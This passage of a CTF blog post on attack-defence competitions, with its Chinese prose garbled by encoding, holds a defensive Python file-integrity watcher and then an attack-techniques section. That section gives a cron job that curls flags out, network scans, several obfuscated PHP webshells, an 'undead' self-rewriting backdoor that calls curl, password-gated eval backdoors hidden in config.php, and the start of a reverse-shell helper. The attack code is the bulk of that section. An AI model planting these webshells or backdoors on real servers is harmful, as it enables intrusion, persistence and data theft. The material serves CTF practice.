class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--</span></span><br><span class="line"><span class="comment"># v demo 0.21 ä¿®æ”¹äº†å¤‡ä»½çš„webshellä¼šè‡ªå·±å‘è‡ªå·±çš„æƒ…å†µ</span></span><br><span class="line"><span class="comment"># todo: windowsä¸‹ä¸æ”¯æŒä¸­æ–‡ç›®å½•</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># æ–‡ä»¶MD5å­—å…¸</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç‰¹æ®Šæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²</span></span><br><span class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></span><br><span class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></span><br><span class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">'drops_log'</span>  <span class="comment"># å…æ­»é‡‘ç‰Œ</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">"utf-8"</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶è·¯å¾„å­—å…¸</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–Unicodeç¼–ç </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®å½•åˆ›å»º</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰æ‰€æœ‰æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æœºæ–‡ä»¶MD5å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> hash</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</span><br><span class="line">        <span class="keyword">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ‰€æœ‰æ–‡ä»¶MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">'bak'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'---------start------------'</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># è·å–æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œå¹¶è·å–æ‰€æœ‰æ–‡ä»¶çš„MD5ï¼ŒåŒæ—¶å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO å¤‡ä»½æ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿé‡åBUG</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># ç§»é™¤æ–°ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filepath, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] webshell find : '</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">'webshell'</span>], ntpath.basename(filepath) + <span class="string">'.txt'</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) + <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># é˜²æ­¢ä»»æ„æ–‡ä»¶è¢«ä¿®æ”¹,è¿˜åŸè¢«ä¿®æ”¹æ–‡ä»¶</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filekey, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print '[*] ' + getUnicode(time.ctime())</span></span><br><span class="line">ä¸ƒã€è‡ªåŠ¨æäº¤</span><br></pre></td></tr></table></figure><h3 id="0x04-æ”»å‡»æŠ€å·§"><a href="#0x04-æ”»å‡»æŠ€å·§" class="headerlink" title="0x04 æ”»å‡»æŠ€å·§"></a>0x04 æ”»å‡»æŠ€å·§</h3><p>1.æ‹¿åˆ°å‘½ä»¤æ‰§è¡Œæ¼æ´åæ‰§è¡Œcrontab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚è€ƒ</span></span><br><span class="line"><span class="comment"># http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</span></span><br><span class="line">*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d <span class="string">'flag='</span>$(cat /home/web/flag/flag)<span class="string">'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'</span></span><br></pre></td></tr></table></figure><p>2.æ³¨æ„æºç ä¸­æˆ–è€…å¤‡ä»½æ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨mysqlç­‰çš„å¼±å£ä»¤</p><p>3.ä¸»æœºå‘ç°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨httpscanè„šæœ¬</span></span><br><span class="line">./httpscan.py 172.16.0.0/24 â€“t 10</span><br><span class="line"><span class="comment"># masscan</span></span><br><span class="line">masscan -p 80 172.16.0.0/24</span><br><span class="line"><span class="comment"># nmap</span></span><br><span class="line">nmap â€“sn 172.16.0.0/24</span><br></pre></td></tr></table></figure><p>4.å¸¸ç”¨çš„ç‰¹æ®Šwebshell</p><p>æ§åˆ¶ç”¨çš„ä¸€å¥è¯æœ¨é©¬ï¼Œæœ€å¥½æ˜¯éœ€è¦èœåˆ€é…ç½®çš„ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†ä¸è®©åˆ«äººè½»æ˜“çš„åˆ©ç”¨ä½ çš„ä¸€å¥è¯ï¼Œè¦ä¸ç„¶å°±åªèƒ½ç­‰ç€åˆ«äººç”¨ä½ çš„è„šæœ¬æ¡åˆ†ã€‚<br>ç®€å•ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿æ¥æ–¹å¼ï¼šphp?2=assertå¯†ç æ˜¯1ã€‚<br>çŒ®ä¸Šæˆ‘å¸¸ç”¨å¾—ä¸€å¥è¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸º<code>?C=phpinfo();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®å¡«<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>è¿æ¥å¯†ç :0ï¼ˆé›¶ï¼‰</p><p>5.æƒé™ç»´æŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'.conifg.php'</span>;</span><br><span class="line">$shell = <span class="string">"&lt;?php echo system("</span>curl <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span><span class="string">"); ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<code>.config.php</code>å‰é¢ä½¿ç”¨ä¸€ä¸ªç‚¹ï¼Œèƒ½å¾ˆå¥½çš„éšè—æ–‡ä»¶ã€‚<br>æƒ³è¦ç»“æŸè¿™ä¸ªè¿›ç¨‹ï¼Œé™¤äº†æœ€æš´åŠ›çš„é‡å¯apacheæœåŠ¡ä¹‹å¤–ï¼Œæ›´ä¸ºä¼˜é›…çš„å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">$pid=<span class="number">1234</span>;</span><br><span class="line">@unlink(<span class="string">'.config.php'</span>);</span><br><span class="line">exec(<span class="string">'kill -9 $pid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæŸ¥çœ‹è¿›ç¨‹ï¼ŒæŸ¥çœ‹å¯¹åº”çš„pidï¼Œå†æ‰§è¡Œå³å¯ã€‚</p><p>ç´ è´¨ä½çš„äººåˆ™ä¼šæ”¾ç½®ä¸€ä¸ªmd5é©¬ï¼Œæ¯”å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç´ è´¨ä½çš„äººåˆå¾ˆçŒ¥çï¼Œåƒ<a href="http://blog.163.com/passw0a_d/blog/static/2508070612017613113859691/" target="_blank" rel="noopener">rootrain</a>è¿™ç§å°±æ˜¯ã€‚é‚£å°±æ˜¯åˆ©ç”¨<code>header</code>ï¼Œæœ€åç»¼åˆèµ·æ¥å°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line"><span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</span><br><span class="line">$test= <span class="string">'flag'</span>;</span><br><span class="line">    header(<span class="string">"flag:$test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ”¾è¿›<code>config.php</code>æ•ˆæœæœ€å¥½ï¼Œå› ä¸ºä¸€èˆ¬å¾ˆå°‘äººå»çœ‹è¿™ä¸ªã€‚</p><p>è¿˜å¯ä»¥é‡‡ç”¨åå¼¹shellçš„æ–¹å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123; </span><br><span class="line">$path = execute(<span class="string">"which $pr"</span>); </span><br><span class="line"><span class="keyword">return</span> ($path ? $path : $pr); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123; </span><br><span class="line">$res = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span> ($cfe) &#123; </span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123; </span><br><span class="line">@exec($cfe,$res); </span><br><span class="line">$res = join(<span class="string">"\n"</span>,$res); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123; </span><br><span class="line">$res = @shell_exec($cfe); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line">@system($cfe); </span><br><span class="line">$res = @ob_get_contents(); </span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line">@passthru($cfe); </span><br><span class="line">$res = @ob_get_contents(); </span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123; </span><br><span class="line">$res = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span>(!@feof($f)) &#123; </span><br><span class="line">$res .= @fread($f,<span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line">@pclose($f); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> $res; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span 